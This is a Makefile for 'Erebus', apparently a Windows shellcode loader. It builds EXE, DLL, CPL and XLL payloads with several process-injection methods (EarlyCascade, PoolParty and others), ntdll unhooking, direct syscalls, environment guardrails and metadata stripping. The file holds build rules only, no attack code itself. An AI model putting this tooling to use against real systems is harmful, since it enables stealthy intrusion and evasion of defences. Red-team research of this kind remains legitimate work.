# Detect operating system/environment
ifeq ($(OS),Windows_NT)
	# Running on Windows (native or MSYS2/MinGW)
	DETECTED_OS := Windows
	ifneq ($(MSYSTEM),)
		# Determine compiler based on architecture
		ARCH ?= x64
		ifeq ($(ARCH),x64)
			CC      := g++
			WINDRES := windres
			MINGW_INCLUDE := -I/mingw64/include
			ARCH_FLAGS := -m64
		else ifeq ($(ARCH),x86)
			CC      := g++
			WINDRES := windres
			MINGW_INCLUDE := -I/mingw32/include
			ARCH_FLAGS := -m32
		endif
	else
		CC      := g++
		WINDRES := windres
		MINGW_INCLUDE :=
	endif
else
	# Running on Linux (use cross-compiler)
	DETECTED_OS := Linux
	ARCH ?= x64
	ifeq ($(ARCH),x64)
		CC      := x86_64-w64-mingw32-g++
		WINDRES := x86_64-w64-mingw32-windres
		MINGW_INCLUDE := -I/usr/x86_64-w64-mingw32/include
		ARCH_FLAGS := -m64
	else ifeq ($(ARCH),x86)
		CC      := i686-w64-mingw32-g++
		WINDRES := i686-w64-mingw32-windres
		MINGW_INCLUDE := -I/usr/i686-w64-mingw32/include
		ARCH_FLAGS := -m32
	endif
endif

BUILD	?= release
TARGET	?= exe
INJECTION_TYPE ?= 3
ARCH    ?= x64

# Common Flags for Loader/Shellcode stability
# -ffreestanding: No standard library startup
# -mno-red-zone: Essential for x64 interrupt safety (x86 doesn't need this)
# -fno-stack-protector: Prevent stack cookies requiring CRT
# -fno-exceptions -fno-rtti: Remove C++ runtime dependencies
COMMON_FLAGS := -Wall -I"$(CURDIR)/include" $(MINGW_INCLUDE) $(ARCH_FLAGS) \
                -masm=intel \
                -fno-stack-protector \
                -fno-exceptions \
                -fno-rtti \
                -Wno-unknown-pragmas \
                -Wno-unused-function \
                -Wno-narrowing \
                -DCONFIG_INJECTION_TYPE=$(INJECTION_TYPE) \
                $(if $(EREBUS_HASH_SEED),-DEREBUS_HASH_SEED=$(EREBUS_HASH_SEED),)

# Add architecture-specific flags
ifeq ($(ARCH),x64)
	COMMON_FLAGS += -mno-red-zone
endif

# Libraries needed for guardrails (iphlpapi for IP address check, ws2_32 for network functions)
LIBS := -liphlpapi -lws2_32 -lnetapi32

ifeq ($(BUILD),debug)
	# O0 is critical for debugging loaders to prevent optimization reordering
	CFLAGS  := -g -O0 -D_DEBUG $(COMMON_FLAGS)
	LDFLAGS := -static -static-libgcc -static-libstdc++ -Wl,--gc-sections
else
	# Aggressive size optimization for release builds
	CFLAGS  := -DNDEBUG -Os $(COMMON_FLAGS) \
	           -ffunction-sections -fdata-sections \
	           -fno-asynchronous-unwind-tables \
	           -fno-unwind-tables \
	           -fno-ident \
	           -fmerge-all-constants
	LDFLAGS := -s -static -static-libgcc -static-libstdc++ \
	           -Wl,--gc-sections \
	           -Wl,--strip-all \
	           -Wl,--no-insert-timestamp \
	           -Wl,--build-id=none
endif

# Check if proxy.def exists in defs folder
DEF_FILE := $(wildcard $(CURDIR)/defs/proxy.def)
ifneq ($(DEF_FILE),)
	DEF_LINK := -Wl,$(DEF_FILE)
else
	DEF_LINK :=
endif

ifeq ($(TARGET),dll)
	CFLAGS  += -DBUILD_DLL
	LDFLAGS += -shared -Wl,--subsystem,windows
	ifneq ($(DEF_LINK),)
		LDFLAGS += $(DEF_LINK)
	endif
	OUT  := erebus.dll
else ifeq ($(TARGET),cpl)
	CFLAGS  += -DBUILD_CPL
	LDFLAGS += -shared -Wl,--subsystem,windows
	OUT  := erebus.cpl
else ifeq ($(TARGET),xll)
	CFLAGS  += -DBUILD_XLL
	LDFLAGS += -shared -Wl,--subsystem,windows
	OUT  := erebus.xll
else
	ifeq ($(BUILD),release)
		LDFLAGS += -mwindows
	endif
	OUT  := erebus.exe
endif

SRCS := $(wildcard src/*.c src/*.cpp src/injection/*.cpp src/helpers/*.cpp src/guardrails/*.cpp src/evasion/*.cpp)
OBJS := $(patsubst %.cpp,%.o,$(patsubst %.c,%.o,$(SRCS)))

# Test sources (exclude main.cpp, use test_erebus.cpp instead)
TEST_SRCS := $(wildcard tests/*.cpp src/helpers/*.cpp)
TEST_OBJS := $(patsubst %.cpp,%.o,$(TEST_SRCS))
TEST_OUT := erebus_test.exe
TEST_DLL_OUT := erebus_test.dll
GUARDRAILS_TEST_OUT := erebus_guardrails_test.exe

%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

%.o: %.cpp
	$(CC) $(CFLAGS) -c $< -o $@

STRIP_SCRIPT := $(CURDIR)/scripts/strip_metadata.py

$(OUT): $(OBJS)
	$(CC) $(LDFLAGS) $^ -o $@ $(LIBS)
ifeq ($(BUILD),release)
	@python3 $(STRIP_SCRIPT) $@ 2>/dev/null || true
endif

all: $(OUT)

dll:
	$(MAKE) TARGET=dll

exe:
	$(MAKE) TARGET=exe

# Architecture targets
x64:
	$(MAKE) ARCH=x64

x86:
	$(MAKE) ARCH=x86

x64-dll:
	$(MAKE) ARCH=x64 TARGET=dll

x86-dll:
	$(MAKE) ARCH=x86 TARGET=dll

x64-exe:
	$(MAKE) ARCH=x64 TARGET=exe

x86-exe:
	$(MAKE) ARCH=x86 TARGET=exe

cpl:
	$(MAKE) TARGET=cpl

x64-cpl:
	$(MAKE) ARCH=x64 TARGET=cpl

x86-cpl:
	$(MAKE) ARCH=x86 TARGET=cpl

xll:
	$(MAKE) TARGET=xll

x64-xll:
	$(MAKE) ARCH=x64 TARGET=xll

x86-xll:
	$(MAKE) ARCH=x86 TARGET=xll

# Debug LDFLAGS for test targets - console subsystem, no stripping, debug symbols
TEST_LDFLAGS := -g -static -static-libgcc -static-libstdc++ -Wl,--gc-sections -mconsole

# Test target - builds and optionally runs the test suite
TEST_CFLAGS := -g -O0 -D_DEBUG -Wall -I"$(CURDIR)/include" $(MINGW_INCLUDE) $(ARCH_FLAGS) -masm=intel -ffunction-sections -fdata-sections -DCONFIG_INJECTION_TYPE=0
TEST_DLL_CFLAGS := $(TEST_CFLAGS) -DBUILD_DLL
TEST_DLL_LDFLAGS := $(TEST_LDFLAGS) -shared -Wl,--subsystem,windows
ifneq ($(DEF_LINK),)
	TEST_DLL_LDFLAGS += $(DEF_LINK)
endif
test:
	$(CC) $(TEST_CFLAGS) -c tests/test_erebus.cpp -o tests/test_erebus.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/compression_helpers.cpp -o src/helpers/compression_helpers.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/crypto_helpers.cpp -o src/helpers/crypto_helpers.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/peb_helpers.cpp -o src/helpers/peb_helpers.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/process_helpers.cpp -o src/helpers/process_helpers.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/api_hashing.cpp -o src/helpers/api_hashing.o
	$(CC) $(TEST_CFLAGS) -c src/guardrails/guardrails.cpp -o src/guardrails/guardrails.o
	$(CC) $(TEST_CFLAGS) -c src/evasion/evasion.cpp -o src/evasion/evasion.o
	$(CC) $(TEST_CFLAGS) -c src/evasion/ntdll_unhook.cpp -o src/evasion/ntdll_unhook.o
	$(CC) $(TEST_CFLAGS) -c src/evasion/syscalls.cpp -o src/evasion/syscalls.o
	$(CC) $(TEST_LDFLAGS) tests/test_erebus.o src/helpers/*.o src/guardrails/*.o src/evasion/*.o -o $(TEST_OUT) $(LIBS)
	@echo "Test binary built: $(TEST_OUT)"

test-dll:
	$(CC) $(TEST_DLL_CFLAGS) -c tests/test_erebus.cpp -o tests/test_erebus.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/helpers/compression_helpers.cpp -o src/helpers/compression_helpers.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/helpers/crypto_helpers.cpp -o src/helpers/crypto_helpers.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/helpers/peb_helpers.cpp -o src/helpers/peb_helpers.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/helpers/process_helpers.cpp -o src/helpers/process_helpers.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/helpers/api_hashing.cpp -o src/helpers/api_hashing.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/guardrails/guardrails.cpp -o src/guardrails/guardrails.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/evasion/evasion.cpp -o src/evasion/evasion.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/evasion/ntdll_unhook.cpp -o src/evasion/ntdll_unhook.o
	$(CC) $(TEST_DLL_CFLAGS) -c src/evasion/syscalls.cpp -o src/evasion/syscalls.o
	$(CC) $(TEST_DLL_LDFLAGS) tests/test_erebus.o src/helpers/*.o src/guardrails/*.o src/evasion/*.o -o $(TEST_DLL_OUT) $(LIBS)
	@echo "Test DLL built: $(TEST_DLL_OUT)"

# Test guardrails - exercises every guardrail check individually
test-guardrails:
	$(CC) $(TEST_CFLAGS) -c tests/test_guardrails.cpp -o tests/test_guardrails.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/compression_helpers.cpp -o src/helpers/compression_helpers.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/crypto_helpers.cpp -o src/helpers/crypto_helpers.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/peb_helpers.cpp -o src/helpers/peb_helpers.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/process_helpers.cpp -o src/helpers/process_helpers.o
	$(CC) $(TEST_CFLAGS) -c src/helpers/api_hashing.cpp -o src/helpers/api_hashing.o
	$(CC) $(TEST_CFLAGS) -c src/guardrails/guardrails.cpp -o src/guardrails/guardrails.o
	$(CC) $(TEST_CFLAGS) -c src/evasion/evasion.cpp -o src/evasion/evasion.o
	$(CC) $(TEST_CFLAGS) -c src/evasion/ntdll_unhook.cpp -o src/evasion/ntdll_unhook.o
	$(CC) $(TEST_CFLAGS) -c src/evasion/syscalls.cpp -o src/evasion/syscalls.o
	$(CC) $(TEST_LDFLAGS) tests/test_guardrails.o src/helpers/*.o src/guardrails/*.o src/evasion/*.o -o $(GUARDRAILS_TEST_OUT) $(LIBS)
	@echo "Guardrails test binary built: $(GUARDRAILS_TEST_OUT)"

# Test specific injection method
# Usage: make test-injection INJECTION_TYPE=2
INJECTION_TEST_CFLAGS := -g -O0 -D_DEBUG -Wall -I"$(CURDIR)/include" $(MINGW_INCLUDE) $(ARCH_FLAGS) -masm=intel -ffunction-sections -fdata-sections -DCONFIG_INJECTION_TYPE=$(INJECTION_TYPE)
INJECTION_TEST_OUT := erebus_injection_test.exe
INJECTION_TEST_DLL_OUT := erebus_injection_test.dll
INJECTION_TEST_DLL_CFLAGS := $(INJECTION_TEST_CFLAGS) -DBUILD_DLL
INJECTION_TEST_CPL_CFLAGS := $(INJECTION_TEST_CFLAGS) -DBUILD_CPL
INJECTION_TEST_XLL_CFLAGS := $(INJECTION_TEST_CFLAGS) -DBUILD_XLL
INJECTION_TEST_CPL_OUT := erebus_injection_test.cpl
INJECTION_TEST_XLL_OUT := erebus_injection_test.xll
INJECTION_TEST_DLL_LDFLAGS := $(TEST_LDFLAGS) -shared -Wl,--subsystem,windows
ifneq ($(DEF_LINK),)
	INJECTION_TEST_DLL_LDFLAGS += $(DEF_LINK)
endif
test-injection:
	$(CC) $(INJECTION_TEST_CFLAGS) -c tests/test_injection.cpp -o tests/test_injection.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/helpers/compression_helpers.cpp -o src/helpers/compression_helpers.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/helpers/crypto_helpers.cpp -o src/helpers/crypto_helpers.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/helpers/peb_helpers.cpp -o src/helpers/peb_helpers.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/helpers/process_helpers.cpp -o src/helpers/process_helpers.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/helpers/api_hashing.cpp -o src/helpers/api_hashing.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/guardrails/guardrails.cpp -o src/guardrails/guardrails.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/evasion/evasion.cpp -o src/evasion/evasion.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/evasion/ntdll_unhook.cpp -o src/evasion/ntdll_unhook.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/evasion/syscalls.cpp -o src/evasion/syscalls.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/injection/injection_ntqueueapcthread.cpp -o src/injection/injection_ntqueueapcthread.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/injection/injection_ntmapviewofsection.cpp -o src/injection/injection_ntmapviewofsection.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/injection/injection_createfiber.cpp -o src/injection/injection_createfiber.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/injection/injection_earlycascade.cpp -o src/injection/injection_earlycascade.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/injection/injection_poolparty.cpp -o src/injection/injection_poolparty.o
	$(CC) $(INJECTION_TEST_CFLAGS) -c src/loader.cpp -o src/loader.o
	$(CC) $(TEST_LDFLAGS) tests/test_injection.o src/helpers/*.o src/guardrails/*.o src/evasion/*.o src/injection/*.o src/loader.o -o $(INJECTION_TEST_OUT) $(LIBS)
	@echo "Injection test binary built: $(INJECTION_TEST_OUT)"
	@echo "Injection type: $(INJECTION_TYPE)"

test-injection-dll:
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c tests/test_injection.cpp -o tests/test_injection.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/helpers/compression_helpers.cpp -o src/helpers/compression_helpers.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/helpers/crypto_helpers.cpp -o src/helpers/crypto_helpers.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/helpers/peb_helpers.cpp -o src/helpers/peb_helpers.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/helpers/process_helpers.cpp -o src/helpers/process_helpers.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/helpers/api_hashing.cpp -o src/helpers/api_hashing.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/guardrails/guardrails.cpp -o src/guardrails/guardrails.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/evasion/evasion.cpp -o src/evasion/evasion.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/evasion/ntdll_unhook.cpp -o src/evasion/ntdll_unhook.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/evasion/syscalls.cpp -o src/evasion/syscalls.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/injection/injection_ntqueueapcthread.cpp -o src/injection/injection_ntqueueapcthread.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/injection/injection_ntmapviewofsection.cpp -o src/injection/injection_ntmapviewofsection.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/injection/injection_createfiber.cpp -o src/injection/injection_createfiber.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/injection/injection_earlycascade.cpp -o src/injection/injection_earlycascade.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/injection/injection_poolparty.cpp -o src/injection/injection_poolparty.o
	$(CC) $(INJECTION_TEST_DLL_CFLAGS) -c src/loader.cpp -o src/loader.o
	$(CC) $(INJECTION_TEST_DLL_LDFLAGS) tests/test_injection.o src/helpers/*.o src/guardrails/*.o src/evasion/*.o src/injection/*.o src/loader.o -o $(INJECTION_TEST_DLL_OUT) $(LIBS)
	@echo "Injection test DLL built: $(INJECTION_TEST_DLL_OUT)"
	@echo "Injection type: $(INJECTION_TYPE)"

test-injection-cpl:
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c tests/test_injection.cpp -o tests/test_injection.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/helpers/compression_helpers.cpp -o src/helpers/compression_helpers.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/helpers/crypto_helpers.cpp -o src/helpers/crypto_helpers.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/helpers/peb_helpers.cpp -o src/helpers/peb_helpers.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/helpers/process_helpers.cpp -o src/helpers/process_helpers.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/helpers/api_hashing.cpp -o src/helpers/api_hashing.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/guardrails/guardrails.cpp -o src/guardrails/guardrails.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/evasion/evasion.cpp -o src/evasion/evasion.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/evasion/ntdll_unhook.cpp -o src/evasion/ntdll_unhook.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/evasion/syscalls.cpp -o src/evasion/syscalls.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/injection/injection_ntqueueapcthread.cpp -o src/injection/injection_ntqueueapcthread.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/injection/injection_ntmapviewofsection.cpp -o src/injection/injection_ntmapviewofsection.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/injection/injection_createfiber.cpp -o src/injection/injection_createfiber.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/injection/injection_earlycascade.cpp -o src/injection/injection_earlycascade.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/injection/injection_poolparty.cpp -o src/injection/injection_poolparty.o
	$(CC) $(INJECTION_TEST_CPL_CFLAGS) -c src/loader.cpp -o src/loader.o
	$(CC) $(INJECTION_TEST_DLL_LDFLAGS) tests/test_injection.o src/helpers/*.o src/guardrails/*.o src/evasion/*.o src/injection/*.o src/loader.o -o $(INJECTION_TEST_CPL_OUT) $(LIBS)
	@echo "Injection test CPL built: $(INJECTION_TEST_CPL_OUT)"
	@echo "Injection type: $(INJECTION_TYPE)"

test-injection-xll:
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c tests/test_injection.cpp -o tests/test_injection.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/helpers/compression_helpers.cpp -o src/helpers/compression_helpers.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/helpers/crypto_helpers.cpp -o src/helpers/crypto_helpers.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/helpers/peb_helpers.cpp -o src/helpers/peb_helpers.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/helpers/process_helpers.cpp -o src/helpers/process_helpers.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/helpers/api_hashing.cpp -o src/helpers/api_hashing.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/guardrails/guardrails.cpp -o src/guardrails/guardrails.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/evasion/evasion.cpp -o src/evasion/evasion.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/evasion/ntdll_unhook.cpp -o src/evasion/ntdll_unhook.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/evasion/syscalls.cpp -o src/evasion/syscalls.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/injection/injection_ntqueueapcthread.cpp -o src/injection/injection_ntqueueapcthread.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/injection/injection_ntmapviewofsection.cpp -o src/injection/injection_ntmapviewofsection.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/injection/injection_createfiber.cpp -o src/injection/injection_createfiber.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/injection/injection_earlycascade.cpp -o src/injection/injection_earlycascade.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/injection/injection_poolparty.cpp -o src/injection/injection_poolparty.o
	$(CC) $(INJECTION_TEST_XLL_CFLAGS) -c src/loader.cpp -o src/loader.o
	$(CC) $(INJECTION_TEST_DLL_LDFLAGS) tests/test_injection.o src/helpers/*.o src/guardrails/*.o src/evasion/*.o src/injection/*.o src/loader.o -o $(INJECTION_TEST_XLL_OUT) $(LIBS)
	@echo "Injection test XLL built: $(INJECTION_TEST_XLL_OUT)"
	@echo "Injection type: $(INJECTION_TYPE)"

# Run tests after building
run-tests: test
	@echo "Running Erebus test suite..."
	$(TEST_OUT)

# Test all injection methods by building with different configurations
test-all-injections:
	@echo "Testing NtMapViewOfSection injection..."
	$(MAKE) clean
	$(MAKE) BUILD=debug INJECTION_TYPE=1
	@echo "Testing CreateFiber injection..."
	$(MAKE) clean
	$(MAKE) BUILD=debug INJECTION_TYPE=2
	@echo "Testing EarlyCascade injection..."
	$(MAKE) clean
	$(MAKE) BUILD=debug INJECTION_TYPE=3
	@echo "Testing PoolParty injection..."
	$(MAKE) clean
	$(MAKE) BUILD=debug INJECTION_TYPE=4
	@echo "All injection types built successfully!"

# Build all test payloads (EXE and DLL for each test type) and copy to payloads directory
PAYLOADS_DIR := $(CURDIR)/payloads
test-all: test-all-payloads
test-all-payloads:
	@echo "=== Building all test payloads ==="
	@mkdir -p $(PAYLOADS_DIR)
	@echo ""
	@echo "[1/15] Building general test EXE..."
	$(MAKE) clean
	$(MAKE) test
	@mv $(TEST_OUT) $(PAYLOADS_DIR)/
	@echo "[2/15] Building general test DLL..."
	$(MAKE) clean
	$(MAKE) test-dll
	@mv $(TEST_DLL_OUT) $(PAYLOADS_DIR)/
	@echo "[3/15] Building guardrails test EXE..."
	$(MAKE) clean
	$(MAKE) test-guardrails
	@mv $(GUARDRAILS_TEST_OUT) $(PAYLOADS_DIR)/
	@echo "[4/15] Building injection test EXE (INJECTION_TYPE=1 - NtMapViewOfSection)..."
	$(MAKE) clean
	$(MAKE) test-injection INJECTION_TYPE=1
	@mv $(INJECTION_TEST_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type1.exe
	@echo "[5/15] Building injection test DLL (INJECTION_TYPE=1 - NtMapViewOfSection)..."
	$(MAKE) clean
	$(MAKE) test-injection-dll INJECTION_TYPE=1
	@mv $(INJECTION_TEST_DLL_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type1.dll
	@echo "[6/15] Building injection test EXE (INJECTION_TYPE=2 - CreateFiber)..."
	$(MAKE) clean
	$(MAKE) test-injection INJECTION_TYPE=2
	@mv $(INJECTION_TEST_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type2.exe
	@echo "[7/15] Building injection test DLL (INJECTION_TYPE=2 - CreateFiber)..."
	$(MAKE) clean
	$(MAKE) test-injection-dll INJECTION_TYPE=2
	@mv $(INJECTION_TEST_DLL_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type2.dll
	@echo "[8/15] Building injection test EXE (INJECTION_TYPE=3 - EarlyCascade)..."
	$(MAKE) clean
	$(MAKE) test-injection INJECTION_TYPE=3
	@mv $(INJECTION_TEST_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type3.exe
	@echo "[9/15] Building injection test DLL (INJECTION_TYPE=3 - EarlyCascade)..."
	$(MAKE) clean
	$(MAKE) test-injection-dll INJECTION_TYPE=3
	@mv $(INJECTION_TEST_DLL_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type3.dll
	@echo "[10/15] Building injection test EXE (INJECTION_TYPE=4 - PoolParty)..."
	$(MAKE) clean
	$(MAKE) test-injection INJECTION_TYPE=4
	@mv $(INJECTION_TEST_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type4.exe
	@echo "[11/15] Building injection test DLL (INJECTION_TYPE=4 - PoolParty)..."
	$(MAKE) clean
	$(MAKE) test-injection-dll INJECTION_TYPE=4
	@mv $(INJECTION_TEST_DLL_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type4.dll
	@echo "[12/15] Building injection test CPL (INJECTION_TYPE=2 - CreateFiber)..."
	$(MAKE) clean
	$(MAKE) test-injection-cpl INJECTION_TYPE=2
	@mv $(INJECTION_TEST_CPL_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type2.cpl
	@echo "[13/15] Building injection test CPL (INJECTION_TYPE=3 - EarlyCascade)..."
	$(MAKE) clean
	$(MAKE) test-injection-cpl INJECTION_TYPE=3
	@mv $(INJECTION_TEST_CPL_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type3.cpl
	@echo "[14/15] Building injection test XLL (INJECTION_TYPE=2 - CreateFiber)..."
	$(MAKE) clean
	$(MAKE) test-injection-xll INJECTION_TYPE=2
	@mv $(INJECTION_TEST_XLL_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type2.xll
	@echo "[15/15] Building injection test XLL (INJECTION_TYPE=3 - EarlyCascade)..."
	$(MAKE) clean
	$(MAKE) test-injection-xll INJECTION_TYPE=3
	@mv $(INJECTION_TEST_XLL_OUT) $(PAYLOADS_DIR)/erebus_injection_test_type3.xll
	@echo ""
	@echo "=== All test payloads built successfully! ==="
	@echo "Location: $(PAYLOADS_DIR)"
	@ls -lh $(PAYLOADS_DIR)/

clean:
	rm -f src/*.o src/helpers/*.o src/injection/*.o src/guardrails/*.o src/evasion/*.o tests/*.o $(RES) $(CURDIR)/erebus.exe $(CURDIR)/erebus.dll $(CURDIR)/erebus.cpl $(CURDIR)/erebus.xll $(TEST_OUT) $(TEST_DLL_OUT) $(GUARDRAILS_TEST_OUT) $(INJECTION_TEST_OUT) $(INJECTION_TEST_DLL_OUT) $(INJECTION_TEST_CPL_OUT) $(INJECTION_TEST_XLL_OUT)

clean-payloads:
	rm -rf $(PAYLOADS_DIR)

clean-all: clean clean-payloads

.PHONY: all dll exe cpl xll x64 x86 x64-dll x86-dll x64-exe x86-exe x64-cpl x86-cpl x64-xll x86-xll test test-dll test-guardrails run-tests test-injection test-injection-dll test-injection-cpl test-injection-xll test-all-injections test-all test-all-payloads clean clean-payloads clean-all
